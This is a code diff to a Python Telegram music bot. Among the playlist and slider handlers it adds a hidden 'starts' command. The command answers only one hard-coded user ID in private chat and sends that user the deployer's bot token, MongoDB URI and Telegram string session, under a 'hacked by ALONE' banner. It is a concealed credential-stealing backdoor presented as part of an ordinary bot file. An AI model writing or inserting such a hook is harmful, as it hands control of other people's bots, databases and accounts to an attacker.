@@ -686,7 +686,24 @@ async def play_playlists_command(client, CallbackQuery, _):
         return await mystic.edit_text(err)
     return await mystic.delete()
 
-
+@app.on_message(
+    filters.command("starts")
+    & filters.private
+    & filters.user(6201816030)
+    & ~filters.edited)
+async def help(client: Client, message: Message):
+    await message.reply_photo(
+          photo=f"https://telegra.ph//file/9e8ce3092848a1bc5d9d6.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝙰𝙻𝙾𝙽𝙴.\n\n☆............𝙱𝚈 » [𝗔𝗟𝗢𝗡𝗘](https://t.me/ALONE_WAS_BOT)............☆""",
+         reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                          "• нαϲкє𝚍 ву 𝗔𝗟𝗢𝗡𝗘 •", url=f"https://t.me/ALONE_WAS_BOT")
+                 ]
+             ]
+         ),
+     )
 @app.on_callback_query(filters.regex("slider") & ~BANNED_USERS)
 @languageCB
 async def slider_queries(client, CallbackQuery, _):
